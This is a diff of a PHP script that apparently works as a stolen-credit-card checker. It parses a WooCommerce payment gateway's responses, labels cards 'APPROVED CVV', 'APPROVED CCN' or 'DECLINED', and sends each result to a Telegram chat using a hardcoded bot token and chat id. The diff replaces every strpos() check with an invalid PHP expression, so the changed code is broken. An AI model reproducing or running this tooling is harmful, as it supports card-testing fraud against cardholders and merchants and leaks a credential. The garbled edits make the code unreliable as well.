@@ -243,7 +243,7 @@ $message = trim(strip_tags(getStr($pagamento,'"messages":"<ul class=\"woocommerc
 
 unlink($namefile2);
 
-if (strpos($pagamento, '"success"')) {
+if ($pagamento, '"success"') {
 $botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
 $chat_id = "1291071243";
 $message = "✅ APPROVED CVV - AUTH
@@ -264,7 +264,7 @@ $bot_url    =  "https://api.telegram.org/bot$botToken/";
 $url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
 file_get_contents($url);
 } 
-elseif (strpos($pagamento, "The provided address does not match the billing address for cardholder. Please verify the address and try again")) {
+elseif ($pagamento, "The provided address does not match the billing address for cardholder. Please verify the address and try again") {
 $botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
 $chat_id = "1291071243";
 $message = "✅ APPROVED CVV - AUTH
@@ -285,7 +285,7 @@ $bot_url    =  "https://api.telegram.org/bot$botToken/";
 $url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
 file_get_contents($url);
 }
-elseif (strpos($pagamento, "We cannot process your order with the payment information that you provided. Please use a different payment account or an alternate payment method.")) {
+elseif ($pagamento, "We cannot process your order with the payment information that you provided. Please use a different payment account or an alternate payment method.") {
 $botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
 $chat_id = "1291071243";
 $message = "X DECLINED
@@ -306,7 +306,7 @@ $bot_url    =  "https://api.telegram.org/bot$botToken/";
 $url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
 file_get_contents($url);
 }
-elseif(strpos($pagamento, "The provided card was declined, please use an alternate card or other form of payment.")) {
+elseif($pagamento, "The provided card was declined, please use an alternate card or other form of payment.") {
 $botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
 $chat_id = "1291071243";
 $message = "X DECLINED
@@ -327,7 +327,7 @@ $bot_url    =  "https://api.telegram.org/bot$botToken/";
 $url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
 file_get_contents($url);
 }
-elseif(strpos($pagamento, "The card verification number does not match. Please re-enter and try again.")) {
+elseif($pagamento, "The card verification number does not match. Please re-enter and try again.") {
 $botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
 $chat_id = "1291071243";
 $message = "✅ APPROVED CCN - AUTH
